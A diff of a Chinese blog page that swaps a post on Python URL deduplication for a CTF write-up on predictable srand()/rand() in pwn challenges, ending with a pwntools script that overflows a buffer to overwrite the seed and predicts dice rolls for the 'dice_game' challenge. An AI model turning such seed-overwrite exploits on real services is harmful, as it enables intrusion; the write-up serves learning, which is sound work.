@@ -102,18 +102,22 @@
 
 
 
-  <meta name="description" content="URL去重URL去重主要有两种方式：  布隆过滤器去重 Hash表去重">
-<meta name="keywords" content="爬虫,url">
+  <meta name="description" content="0x00 前言PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="URL去重去似">
-<meta property="og:url" content="https://fl4g.cn/2018/05/24/url去重去似/index.html">
+<meta property="og:title" content="PWN中伪随机数问题--srand()&#x2F;rand()">
+<meta property="og:url" content="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/index.html">
 <meta property="og:site_name" content="zering的博客">
-<meta property="og:description" content="URL去重URL去重主要有两种方式：  布隆过滤器去重 Hash表去重">
+<meta property="og:description" content="0x00 前言PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-09-02T07:53:18.449Z">
+<meta property="og:image" content="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/rand运行.png">
+<meta property="og:image" content="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/srand为2.png">
+<meta property="og:image" content="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/zering/hexo/source/_posts/2020-09-07-PWN中伪随机数问题-srand-rand/dice-game.png">
+<meta property="og:updated_time" content="2020-09-07T10:13:02.278Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="URL去重去似">
-<meta name="twitter:description" content="URL去重URL去重主要有两种方式：  布隆过滤器去重 Hash表去重">
+<meta name="twitter:title" content="PWN中伪随机数问题--srand()&#x2F;rand()">
+<meta name="twitter:description" content="0x00 前言PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。">
+<meta name="twitter:image" content="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/rand运行.png">
 
 
 
@@ -122,7 +126,7 @@
 
 
 
-  <link rel="canonical" href="https://fl4g.cn/2018/05/24/url去重去似/">
+  <link rel="canonical" href="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/">
 
 
 
@@ -132,7 +136,7 @@
   };
 </script>
 
-  <title>URL去重去似 | zering的博客</title>
+  <title>PWN中伪随机数问题--srand()/rand() | zering的博客</title>
   
 
 
@@ -298,7 +302,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://fl4g.cn/2018/05/24/url去重去似/">
+    <link itemprop="mainEntityOfPage" href="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="zering">
@@ -315,7 +319,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">URL去重去似
+          <h1 class="post-title" itemprop="name headline">PWN中伪随机数问题--srand()/rand()
               
             
           </h1>
@@ -340,24 +344,12 @@
                 
               
 
-              <time title="创建时间：2018-05-24 09:48:54" itemprop="dateCreated datePublished" datetime="2018-05-24T09:48:54+08:00">2018-05-24</time>
+              <time title="创建时间：2020-09-07 17:03:44 / 修改时间：18:13:02" itemprop="dateCreated datePublished" datetime="2020-09-07T17:03:44+08:00">2020-09-07</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2020-09-02 15:53:18" itemprop="dateModified" datetime="2020-09-02T15:53:18+08:00">2020-09-02</time>
               
             
           </span>
@@ -374,7 +366,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a></span>
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
 
                 
                 
@@ -389,8 +381,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/05/24/url去重去似/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/05/24/url去重去似/" itemprop="commentCount"></span>
+                <a href="/2020/09/07/PWN中伪随机数问题-srand-rand/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2020/09/07/PWN中伪随机数问题-srand-rand/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -425,52 +417,28 @@
       
 
       
-        <h2 id="URL去重"><a href="#URL去重" class="headerlink" title="URL去重"></a>URL去重</h2><p>URL去重主要有两种方式：</p>
-<ul>
-<li>布隆过滤器去重</li>
-<li><p>Hash表去重</p>
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
 <a id="more"></a>
-<h3 id="布隆过滤器去重"><a href="#布隆过滤器去重" class="headerlink" title="布隆过滤器去重"></a>布隆过滤器去重</h3><ol>
-<li>需要一个数组和k个映射函数，初始将数组array所有位置都置0。</li>
-<li>将元素集S={s1,s2……sn}中每个元素sj，通过k个映射函数{f1,f2……fk}映射为K个值{g1，g2……gk},将array中对应的array[g1],array[g2]……array[gk]置为1.</li>
-<li>若元素item通过映射函数得到的k个值在array中对应的值全为1，则item在S中，否则不在。</li>
-</ol>
-<p>python有两个第三方插件实现了此功能：</p>
-<ul>
-<li>Python-bloomfilter<br>项目地址:<a href="https://github.com/jaybaird/Python-bloomfilter" target="_blank" rel="noopener">https://github.com/jaybaird/Python-bloomfilter</a></li>
-<li>Pybloomfiltermmap<br>项目地址:<a href="https://github.com/axiak/Pybloomfiltermmap" target="_blank" rel="noopener">https://github.com/axiak/Pybloomfiltermmap</a><br>官方文档:<a href="https://axiak.github.io/pybloomfiltermmap/" target="_blank" rel="noopener">https://axiak.github.io/pybloomfiltermmap/</a></li>
-</ul>
-<p>Pybloomfiltermmap模块实现两类布隆过滤器：Bloomfilter和ScalableBloomfilter。<br>Bloomfilter是一个定容过滤器，error_rate指最大误报率；<br>ScalableBloomfilter是一个不定容过滤器。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pybloomfilter <span class="keyword">import</span> BloomFilter</span><br><span class="line"><span class="comment"># 创建一个capacity等于100万，error rate等于0.001的bloomfilter对象</span></span><br><span class="line">bfilter = BloomFilter(<span class="number">1000000</span>,<span class="number">0.001</span>,<span class="string">'bf_test.bloom'</span>)</span><br></pre></td></tr></table></figure>
-<p>方法add是添加元素，若元素已存在，则返回True，若不存在则返回False，并添加到过滤器中。</p>
-<p>布隆过滤器存在一定的误判率。</p>
-<h3 id="Hash表去重"><a href="#Hash表去重" class="headerlink" title="Hash表去重"></a>Hash表去重</h3><p>遍历URL列表，判断每个URL是否在去重后的列表里，如果不在，则加入列表。根据哈希表存放的位置，可以分为两种方式：一种是基于内存的Hash表去重；一种是基于硬盘的Hash表去重。</p>
-<h4 id="方法一：利用内存Hash表去重"><a href="#方法一：利用内存Hash表去重" class="headerlink" title="方法一：利用内存Hash表去重"></a>方法一：利用内存Hash表去重</h4><p>使用如下代码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">  <span class="keyword">if</span> url <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">    result.append(url)</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-<p>由于URL长度不固定，单个URL长度越长，使用URL存储内存和性能损耗过快，此时需对URL进行Hash运算压缩，如：16位md5运算。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 2.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(<span class="string">"hello"</span>).hexdigest()[<span class="number">8</span>:<span class="number">-8</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python 3.x</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">print(hashlib.md5(<span class="string">"hello"</span>.encode(<span class="string">'utf-8'</span>)).hexdigest())[<span class="number">8</span>:<span class="number">-8</span>]</span><br></pre></td></tr></table></figure>
-<h4 id="方法二：利用BerkeleyDB去重"><a href="#方法二：利用BerkeleyDB去重" class="headerlink" title="方法二：利用BerkeleyDB去重"></a>方法二：利用BerkeleyDB去重</h4><p>BerkeleyDB是一个key-value database，简单的说，就是一个在disk上的hash表。存储的是“key-value”键值对。<br>下载安装Berkeley DB安装。Python需要安装bsddb3模块来提供BerkeleyDB数据库的操作接口。<br>Berkeley DB次你在四种数据访问模式：</p>
-<ul>
-<li>btree：树结构，存储任意复杂key和value</li>
-<li>hash：hash存储，访问量巨大时，效果好</li>
-<li>queue：队列操作，只能存储定长数据，key必须是数字</li>
-<li>recno：与queue相似，但支持边长value</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bsddb</span><br><span class="line">mydb = bsddb.db.DB()</span><br><span class="line">mydb.open(<span class="string">'mydb.db'</span>,dbtype = bsddb.db.DB_HASH, flags = bsddb.db.DB_CREATE)</span><br><span class="line">mydb.put(<span class="string">"key"</span>,<span class="string">"value"</span>)</span><br><span class="line">mydb.close()</span><br></pre></td></tr></table></figure>
-<p>设置数据访问方法：<br>btree是 bsddb.db.DB_BTREE， hash是bsddb.db.DB_HASH<br>queu 是 bsddb.db.DB_QUEUE,  recno 是bsddb.db.DB_RECNO<br>设置flags参数为DB_CREATE表明如果数据文件不存在则新建一个空的数据文件。<br>使用DB的put方法存储一个Key/Value对</p>
-</li>
-</ul>
-<h2 id="URL去似去含"><a href="#URL去似去含" class="headerlink" title="URL去似去含"></a>URL去似去含</h2><p>相似URL特征：</p>
-<ul>
-<li>协议相同（protocol）</li>
-<li>主机名相同（host）</li>
-<li>端口相同（port）</li>
-<li>资源路劲相同（path）</li>
-<li>参数名所组成列表相同或包含</li>
-</ul>
-<p>python2.x使用urlparse，python3.x使用urllib，以python2.x为例：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line">url=<span class="string">'http://www.baidu.com:80/s?wd=python&amp;ie=utf-8#123'</span></span><br><span class="line">r=urlparse.urlparse(url)</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line"><span class="keyword">print</span> r.netloc</span><br><span class="line"><span class="keyword">print</span> r.hostname</span><br><span class="line"><span class="keyword">print</span> r.port</span><br><span class="line"><span class="keyword">print</span> urlparse.parse_qs(r.query)</span><br><span class="line">res = urlparse.urlsplit(url)</span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure></p>
-<p>输出结果：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ParseResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com:80'</span>, path=<span class="string">'/s'</span>, params=<span class="string">''</span>, query=<span class="string">'wd=python&amp;ie=utf-8'</span>, fragment=<span class="string">'123'</span>)</span><br><span class="line">www.baidu.com:80</span><br><span class="line">www.baidu.com</span><br><span class="line">80</span><br><span class="line">SplitResult(scheme=<span class="string">'http'</span>, netloc=<span class="string">'www.baidu.com:80'</span>, path=<span class="string">'/s'</span>, query=<span class="string">'wd=python&amp;ie=utf-8'</span>, fragment=<span class="string">'123'</span>)</span><br></pre></td></tr></table></figure></p>
-<p>r = urlparse.urlparse(url)返回一个6个元组，分别为scheme, netloc, path, params, query, fragment，ParseResult类还有几个常用方法：<br>res.username<br>res.password<br>res.hostname<br>res.port<br>res.geturl()<br>urlunparse与之相反,将6个元组组成一个string。<br>urlsplit将path与params合并为path，存在urlunsplit与之相反功能。<br>使用urlparse.parse_qs()函数获取r.query中的参数列表，输出为字典。<br><strong>注释：url必须以<em><a href="http://xxx" target="_blank" rel="noopener">http://xxx</a></em>开头,否则会出错。</strong></p>
+<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
+<p>我们使用如下代码生成10个随机数：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时查看运行结果，多次运行结果一样。</p>
+<p><img src="/2020/09/07/PWN中伪随机数问题-srand-rand/rand运行.png" style="zoom:50%;"></p>
+<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果如图：</p>
+<p><img src="/2020/09/07/PWN中伪随机数问题-srand-rand/srand为2.png" style="zoom:50%;"></p>
+<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界–dice_game</strong></p>
+<p>我们直接拖入ida看源码</p>
+<p><img src="/2020/09/07/PWN中伪随机数问题-srand-rand/zering/hexo/source/_posts/2020-09-07-PWN中伪随机数问题-srand-rand/dice-game.png" style="zoom:80%;"></p>
+<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
+<p>python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">'libc.so.6'</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Welcome, let me know your name: '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'Give me the point(1~6): '</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
+<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266" target="_blank" rel="noopener">关于rand()和srand()</a></p>
+<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862" target="_blank" rel="noopener">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
 
       
     </div>
@@ -503,7 +471,7 @@
     <strong>本文作者： </strong>zering</li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://fl4g.cn/2018/05/24/url去重去似/" title="URL去重去似">https://fl4g.cn/2018/05/24/url去重去似/</a>
+    <a href="https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/" title="PWN中伪随机数问题--srand()/rand()">https://fl4g.cn/2020/09/07/PWN中伪随机数问题-srand-rand/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！</li>
@@ -516,9 +484,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/爬虫/" rel="tag"><i class="fa fa-tag"></i> 爬虫</a>
-          
-            <a href="/tags/url/" rel="tag"><i class="fa fa-tag"></i> url</a>
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
           
         </div>
       
@@ -531,8 +497,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/05/14/python学习-argparse模块/" rel="next" title="python学习-argparse模块">
-                <i class="fa fa-chevron-left"></i> python学习-argparse模块
+              <a href="/2020/09/03/PWN中格式化字符串漏洞/" rel="next" title="PWN中格式化字符串漏洞">
+                <i class="fa fa-chevron-left"></i> PWN中格式化字符串漏洞
               </a>
             
           </div>
@@ -540,10 +506,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/06/01/Android逆向-smali语法/" rel="prev" title="Android逆向-smali语法">
-                Android逆向-smali语法 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -764,7 +726,7 @@
 			        
 			
 			        
-			          <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#URL去重"><span class="nav-number">1.</span> <span class="nav-text">URL去重</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#布隆过滤器去重"><span class="nav-number">1.1.</span> <span class="nav-text">布隆过滤器去重</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hash表去重"><span class="nav-number">1.2.</span> <span class="nav-text">Hash表去重</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#方法一：利用内存Hash表去重"><span class="nav-number">1.2.1.</span> <span class="nav-text">方法一：利用内存Hash表去重</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#方法二：利用BerkeleyDB去重"><span class="nav-number">1.2.2.</span> <span class="nav-text">方法二：利用BerkeleyDB去重</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URL去似去含"><span class="nav-number">2.</span> <span class="nav-text">URL去似去含</span></a></li></ol></div>
+			          <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-关于rand-和sand"><span class="nav-number">2.</span> <span class="nav-text">0x01 关于rand()和sand()</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#rand"><span class="nav-number">2.1.</span> <span class="nav-text">rand()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#srand"><span class="nav-number">2.2.</span> <span class="nav-text">srand()</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-简单示例"><span class="nav-number">3.</span> <span class="nav-text">0x02 简单示例</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-参考"><span class="nav-number">4.</span> <span class="nav-text">0x03 参考</span></a></li></ol></div>
 			        
 			
 			      </div>
